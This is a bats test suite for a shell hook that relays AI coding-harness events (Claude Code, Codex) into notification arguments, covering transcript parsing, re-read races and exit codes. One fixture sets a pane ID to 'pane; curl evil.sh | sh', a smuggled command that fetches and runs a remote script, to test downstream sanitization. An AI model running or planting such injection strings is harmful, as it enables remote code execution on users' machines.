#!/usr/bin/env bats
# relay-agent.sh is the pns hook BOTH harnesses fire: Claude Code through the
# hooks block in private_dot_claude/modify_settings.json, Codex through the
# ~/.codex/hooks.json that hooks/codex/install-hooks.sh writes. It turns a
# harness payload into the argument list relay.sh takes.
#
# WHAT THIS COSTS AND WHY IT IS SHAPED THIS WAY. Every behavior about ARGUMENT
# ASSEMBLY needs the real process. A run with a reply already in the transcript
# costs 35-60ms, but a `done` run that finds NO reply pays the hook's re-read
# window on top, ~600ms of it, and the three no-reply fixtures below are exactly
# that case. Either way it is more than a unit test may spend. So the runs
# happen ONCE in setup_file, CONCURRENTLY (they share nothing but a tmpdir, and
# each writes its own files, so the window is paid once wall-clock rather than
# per fixture), and a test reads a recording instead of spawning anything. The
# reply-shaping behaviors need no process at all: pns_flatten_reply lives in the
# decision core, so those tests source it, exactly as pns-event.bats does for
# relay.sh's decisions.
#
# RELAY_SUMMARIZING is set for every run. It is the hook's own re-entry guard,
# and it keeps the optional `codex exec` summarizer out of a unit test, which
# would otherwise be a network round trip on any machine that has codex.

# The sync seam, in two halves. The hook side is a `sleep` the hook inherits as
# an exported function: it announces the wait by dropping RELAY_SLEEP_MARKER,
# then does the real wait. Only the two race captures set that variable, so
# every other run delegates and behaves exactly as before.
sleep() {
  [[ -n ${RELAY_SLEEP_MARKER:-} ]] && : >"$RELAY_SLEEP_MARKER"
  command sleep "$@"
}
export -f sleep

# flush_when_hook_waits <marker> <transcript> <line>: the fixture side. Append
# <line> as soon as the hook is inside its re-read window, or after a 0.5s
# fallback if the hook never waits at all, which is what makes a no-retry
# regression fail rather than pass late.
flush_when_hook_waits() {
  local marker="$1" transcript="$2" line="$3" waited=0
  while [[ ! -e $marker && $waited -lt 50 ]]; do
    command sleep 0.01
    waited=$((waited + 1))
  done
  printf '%s\n' "$line" >>"$transcript"
}

setup_file() {
  export HOOK="$BATS_TEST_DIRNAME/../../dot_local/libexec/pns/hooks/executable_relay-agent.sh"
  # A hostile environment must not reach the hook: PNS_HELPERS_DIR would
  # repoint the decision core, and the other three steer the summarizer this
  # file deliberately does not exercise.
  unset PNS_HELPERS_DIR RELAY_AGENT CODEX_BIN RELAY_CODEX_HOME
  export RELAY_SUMMARIZING=1
  export HERDR_PANE_ID='pane; curl evil.sh | sh'

  # relay.sh stands in as a stub that records the argument list it was handed,
  # NUL separated so a value carrying a space or a newline reads back intact.
  export RELAY_BIN="$BATS_FILE_TMPDIR/relay-stub.sh"
  printf '#!/usr/bin/env bash\nprintf "%%s\\0" "$@" >"$RELAY_ARGV_OUT"\n' >"$RELAY_BIN"
  chmod +x "$RELAY_BIN"
  printf '#!/usr/bin/env bash\nexit 9\n' >"$BATS_FILE_TMPDIR/failing-relay.sh"
  chmod +x "$BATS_FILE_TMPDIR/failing-relay.sh"

  # Two turns, so "the LAST turn" is a claim the fixture can falsify, and the
  # last turn speaks in TWO text blocks, so the blank line the extraction joins
  # them with is a claim too: a run of whitespace is what the flatten collapses
  # back to one space, and a join that dropped it would read as one word.
  cat >"$BATS_FILE_TMPDIR/two-turns.jsonl" <<'TRANSCRIPT'
{"type":"user","message":{"content":"the first question"}}
{"type":"assistant","message":{"content":[{"type":"text","text":"STALE, from the previous turn."}]}}
{"type":"user","message":{"content":"the second question"}}
{"type":"assistant","message":{"content":[{"type":"text","text":"Ran the suite and it passed."},{"type":"text","text":"The lint gate is green too."}]}}
TRANSCRIPT
  # A tail cut mid-line is the NORMAL shape of a long transcript: the hook reads
  # the last 4MB, so the first line it sees is usually a fragment. The reply
  # must survive it rather than the whole parse dying on one broken line.
  cat >"$BATS_FILE_TMPDIR/cut-first-line.jsonl" <<'TRANSCRIPT'
{"type":"assistant","message":{"content":[{"type":"text","tex
{"type":"user","message":{"content":"q"}}
{"type":"assistant","message":{"content":[{"type":"text","text":"Survived the cut."}]}}
TRANSCRIPT
  printf 'this is not json\nand neither is this\n' >"$BATS_FILE_TMPDIR/not-json.jsonl"
  : >"$BATS_FILE_TMPDIR/empty.jsonl"
  printf '{"type":"user","message":{"content":"q"}}\n' >"$BATS_FILE_TMPDIR/unreadable.jsonl"
  chmod 000 "$BATS_FILE_TMPDIR/unreadable.jsonl"

  # The live 2026-08-12 capture: at Stop-hook time the harness had not yet
  # flushed the assistant's final text, so a single read found no reply and the
  # notification went out with no summary at all. Two fixtures reproduce it,
  # one per door into the same symptom: nothing there yet, and an assistant
  # block carrying only whitespace, which is non-empty until it is flattened.
  #
  # Both are SYNCHRONIZED rather than timed. A fixture that just slept 150ms
  # before appending could let a descheduled hook read the finished file on its
  # FIRST try, and then the unfixed code passes: a false negative, in the one
  # direction a race fixture must never fail. So `sleep` is exported as a shell
  # function into the hook's environment, where it drops a marker the instant
  # the hook first waits, and the appender holds its write until that marker
  # appears. The late text therefore lands inside the re-read window on any
  # machine, however loaded. A hook that never re-reads never drops a marker,
  # so the 0.5s fallback flushes far too late for it, and the unfixed code
  # fails every run instead of most runs.
  printf '{"type":"user","message":{"content":"q"}}\n' >"$BATS_FILE_TMPDIR/lagging.jsonl"
  flush_when_hook_waits "$BATS_FILE_TMPDIR/lagging.marker" "$BATS_FILE_TMPDIR/lagging.jsonl" \
    '{"type":"assistant","message":{"content":[{"type":"text","text":"The late-flushed reply."}]}}' &
  printf '{"type":"user","message":{"content":"q"}}\n{"type":"assistant","message":{"content":[{"type":"text","text":"   "}]}}\n' \
    >"$BATS_FILE_TMPDIR/whitespace-first.jsonl"
  flush_when_hook_waits "$BATS_FILE_TMPDIR/whitespace.marker" "$BATS_FILE_TMPDIR/whitespace-first.jsonl" \
    '{"type":"assistant","message":{"content":[{"type":"text","text":"The real text, late."}]}}' &

  # cwd is a path that does NOT exist on purpose: the project name is derived
  # from the string, and a real directory would fork git for a branch as well.
  (
    export RELAY_SLEEP_MARKER="$BATS_FILE_TMPDIR/lagging.marker"
    capture lagging_transcript 'done' "$(payload_with "$BATS_FILE_TMPDIR/lagging.jsonl")"
  ) &
  (
    export RELAY_SLEEP_MARKER="$BATS_FILE_TMPDIR/whitespace.marker"
    capture whitespace_first 'done' "$(payload_with "$BATS_FILE_TMPDIR/whitespace-first.jsonl")"
  ) &
  capture cut_first_line 'done' "$(payload_with "$BATS_FILE_TMPDIR/cut-first-line.jsonl")" &
  capture done_turn 'done' "$(payload_with "$BATS_FILE_TMPDIR/two-turns.jsonl")" &
  capture blocked_state 'blocked' "$(payload_with '' 'permission to run brew')" &
  capture asked_state 'asked' "$(payload_with '' 'which of the two?')" &
  capture plan_ready_state 'plan-ready' "$(payload_with '' 'the plan is ready')" &
  capture not_json 'done' "$(payload_with "$BATS_FILE_TMPDIR/not-json.jsonl")" &
  capture empty_transcript 'done' "$(payload_with "$BATS_FILE_TMPDIR/empty.jsonl")" &
  capture unreadable 'done' "$(payload_with "$BATS_FILE_TMPDIR/unreadable.jsonl")" &
  capture absent_transcript 'done' "$(payload_with /no/such/transcript.jsonl 'the payload said so')" &
  RELAY_BIN="$BATS_FILE_TMPDIR/failing-relay.sh" capture relay_failed 'done' "$(payload_with '')" &
  PNS_HELPERS_DIR="$BATS_FILE_TMPDIR/no-such-helpers" capture no_core 'done' "$(payload_with '')" &
  wait
}

teardown_file() {
  chmod 644 "$BATS_FILE_TMPDIR/unreadable.jsonl" 2>/dev/null || true
}

setup() {
  # shellcheck source=dot_local/libexec/pns/helpers/event.sh
  source "$BATS_TEST_DIRNAME/../../dot_local/libexec/pns/helpers/event.sh"
}

# payload_with <transcript_path> [message]: one harness hook payload.
payload_with() {
  jq -cn --arg t "${1:-}" --arg m "${2:-}" \
    '{cwd: "/nowhere/webdavis/dotfiles"}
     + (if $t == "" then {} else {transcript_path: $t} end)
     + (if $m == "" then {} else {message: $m} end)'
}

# capture <name> <state> <payload>: run the hook once, keep its argv and status.
capture() {
  local name="$1" state="$2" payload="$3" status=0
  printf '%s' "$payload" |
    RELAY_ARGV_OUT="$BATS_FILE_TMPDIR/$name.argv" "$HOOK" "$state" \
      >"$BATS_FILE_TMPDIR/$name.out" 2>"$BATS_FILE_TMPDIR/$name.err" || status=$?
  printf '%s' "$status" >"$BATS_FILE_TMPDIR/$name.status"
}

# flag <name> <flag>: the value relay.sh was handed for <flag>, or non-zero.
flag() {
  local name="$1" want="$2" i
  local -a argv=()
  [[ -s "$BATS_FILE_TMPDIR/$name.argv" ]] || return 1
  mapfile -d '' -t argv <"$BATS_FILE_TMPDIR/$name.argv"
  for ((i = 0; i < ${#argv[@]}; i++)); do
    if [[ ${argv[i]} == "$want" ]]; then
      printf '%s' "${argv[i + 1]-}"
      return 0
    fi
  done
  return 1
}

# refute_flag <name> <flag>: fail, loudly, if relay.sh was handed <flag>.
# Written as a plain call rather than `! flag ...` because bats and errexit
# both ignore an inverted pipeline, which is how a refutation goes dead.
refute_flag() {
  local value
  if value="$(flag "$1" "$2")"; then
    printf 'expected no %s, got %s\n' "$2" "$value" >&2
    return 1
  fi
  return 0
}

exit_status() { cat "$BATS_FILE_TMPDIR/$1.status"; }

# --- the state the harness names --------------------------------------------

@test "the state the harness names reaches relay as --state, unchanged" {
  [ "$(flag done_turn --state)" = "done" ]
  [ "$(flag blocked_state --state)" = blocked ]
  [ "$(flag asked_state --state)" = asked ]
  [ "$(flag plan_ready_state --state)" = plan-ready ]
}

# --- what the notification says ---------------------------------------------

@test "a transcript still flushing at hook time is re-read until the reply lands" {
  [ "$(flag lagging_transcript --detail)" = "The late-flushed reply." ]
}

@test "a reply that is only whitespace is waited out like an absent one" {
  # The same missing-summary symptom through another door: whitespace text is
  # non-empty as extracted and empty once flattened, so a window measured on
  # the RAW read would stop early and ship the notification with no summary.
  [ "$(flag whitespace_first --detail)" = "The real text, late." ]
}

@test "the summary is the assistant text of the transcript's LAST turn" {
  # Both text blocks of that turn, in order: the extraction joins them on a
  # blank line, which the flatten then collapses to the single space asserted
  # here. A join that dropped the separator would run the two into one word.
  [ "$(flag done_turn --detail)" = "Ran the suite and it passed. The lint gate is green too." ]
}

@test "a transcript whose first line was cut mid-JSON still yields its reply" {
  # The hook reads a 4MB tail, so the first line it sees is routinely a
  # fragment. Only that line may be dropped; the turn behind it must survive.
  [ "$(flag cut_first_line --detail)" = "Survived the cut." ]
}

@test "the project name is the last segment of the payload's cwd" {
  [ "$(flag done_turn --project)" = dotfiles ]
}

@test "the herdr pane id reaches relay verbatim, hostile value and all" {
  # Verbatim is the contract: relay.sh sanitizes the pane once, for every
  # channel (pns_pane_is_safe), so a hook that scrubbed it here would be the
  # second copy of that guard, and copies of a guard rot apart.
  [ "$(flag done_turn --pane)" = 'pane; curl evil.sh | sh' ]
}

@test "an absent transcript falls back to the summary the payload carried" {
  [ "$(flag absent_transcript --detail)" = "the payload said so" ]
}

@test "a transcript with no readable turn in it still notifies, with no summary" {
  # Each case asserts the notification WENT OUT (--state arrived) as well as
  # carrying no summary. Without that half the refutation passes for the worst
  # possible reason: a hook that died before it ever called relay.
  local name
  for name in not_json empty_transcript unreadable; do
    [ "$(flag "$name" --state)" = "done" ]
    refute_flag "$name" --detail
  done
}

# --- the exit contract -------------------------------------------------------

@test "nothing that goes wrong building a notification fails the harness turn" {
  # Both ends of the hook: relay itself exiting non-zero, and the decision core
  # the hook sources being absent. Exit 0 is the whole contract, because a
  # notification is not worth a red turn in the harness that asked for it.
  [ "$(exit_status relay_failed)" = 0 ]
  [ "$(exit_status no_core)" = 0 ]
  # And the third end: a re-read window that EXPIRES. These three fixtures are
  # the only runs that reach the end of the retry loop empty-handed, so without
  # them the contract is unguarded on the path the retry added.
  local name
  for name in not_json empty_transcript unreadable; do
    [ "$(exit_status "$name")" = 0 ]
  done
}

# --- pns_flatten_reply, the reply shaping, called directly -------------------

@test "a multi-line reply is flattened to one space-separated line" {
  [ "$(pns_flatten_reply "$(printf '  first\nsecond\twith   runs \n')")" = "first second with runs" ]
}

@test "a reply that mentions a glob is not expanded against the filesystem" {
  # The flatten splits on whitespace, and splitting is also where bash would
  # glob. A turn that says it deleted *.jsonl must not arrive at the phone as
  # the contents of whatever directory the hook happened to run in, so this
  # runs somewhere that HAS files the pattern matches.
  cd "$BATS_FILE_TMPDIR" || return 1
  [ "$(pns_flatten_reply 'removed *.jsonl')" = 'removed *.jsonl' ]
}

@test "only an over-long reply is cut, and it is cut to its TAIL" {
  [ "$(pns_flatten_reply 'short enough' 8000)" = "short enough" ]
  [ "$(pns_flatten_reply 'abcdefghij' 4)" = ghij ]
}

@test "a garbage re-read knob still notifies and still exits 0" {
  # Both knobs are set to something unusable at once. The attempt count is the
  # dangerous one: bash evaluates a bare word in [[ -lt ]] as a variable name in
  # arithmetic context, so under `set -u` an unvalidated value exits the hook 1
  # (measured) and the harness turn goes red over a notification setting.
  run env PNS_REPLY_REREAD_ATTEMPTS=abc PNS_REPLY_REREAD_INTERVAL=abc \
    RELAY_ARGV_OUT="$BATS_TEST_TMPDIR/knobs.argv" \
    "$HOOK" done <<<"$(payload_with "$BATS_FILE_TMPDIR/empty.jsonl")"
  [ "$status" -eq 0 ]
  tr '\0' '\n' <"$BATS_TEST_TMPDIR/knobs.argv" | grep -qx -- '--state'
}

@test "an installed engine binary is what the hook calls, with no override set" {
  # Both the harness suites above set RELAY_BIN, which the resolver honors as
  # an explicit override, so nothing there can tell the repoint from the old
  # hardcoded bash path. This is the slice's whole point: after the binary is
  # installed the hook must stop calling the bash engine, or the retirement
  # turns every agent notification into a missing-file no-op.
  local sandbox="$BATS_TEST_TMPDIR/repoint"
  mkdir -p "$sandbox/.local/libexec/pns"
  printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$@" >"%s/binary-argv"\n' "$sandbox" \
    >"$sandbox/.local/libexec/pns/pns"
  printf '#!/usr/bin/env bash\nprintf bash-engine >"%s/bash-ran"\n' "$sandbox" \
    >"$sandbox/.local/libexec/pns/relay.sh"
  chmod +x "$sandbox/.local/libexec/pns/pns" "$sandbox/.local/libexec/pns/relay.sh"

  run env -u RELAY_BIN HOME="$sandbox" RELAY_SUMMARIZING=1 \
    "$HOOK" done <<<'{"cwd":"/tmp/project","message":"a detail"}'
  [ "$status" -eq 0 ]
  [ ! -f "$sandbox/bash-ran" ]
  grep -qx -- '--agent' "$sandbox/binary-argv"
}

@test "a missing engine resolver never answers the approval prompt for the operator" {
  # Everything above the handoff is a notification, and a notification that
  # cannot be delivered must not fail the turn. The BLOCKED path is the one
  # exception: its exit code IS the operator's decision, so a helper that
  # cannot be sourced must degrade to the bash engine rather than short
  # circuit the hook and report success in their place.
  local sandbox="$BATS_TEST_TMPDIR/no-resolver"
  mkdir -p "$sandbox/helpers" "$sandbox/bin"
  # The decision core is present; the engine resolver deliberately is not.
  cp "$BATS_TEST_DIRNAME/../../dot_local/libexec/pns/helpers/event.sh" "$sandbox/helpers/"
  printf '#!/usr/bin/env bash\nexit 7\n' >"$sandbox/bin/gate.sh"
  printf '#!/usr/bin/env bash\nexit 7\n' >"$sandbox/bin/moshi-hook"
  printf '#!/usr/bin/env bash\nexit 0\n' >"$sandbox/bin/relay.sh"
  chmod +x "$sandbox/bin/gate.sh" "$sandbox/bin/moshi-hook" "$sandbox/bin/relay.sh"

  run env PNS_HELPERS_DIR="$sandbox/helpers" PNS_MOSHI_GATE="$sandbox/bin/gate.sh" \
    MOSHI_HOOK_BIN="$sandbox/bin/moshi-hook" RELAY_BIN="$sandbox/bin/relay.sh" \
    RELAY_SUMMARIZING=1 RELAY_IDLE_SECS=99999 \
    "$HOOK" blocked <<<'{"cwd":"/tmp/p","message":"needs approval"}'
  [ "$status" -eq 7 ]
}
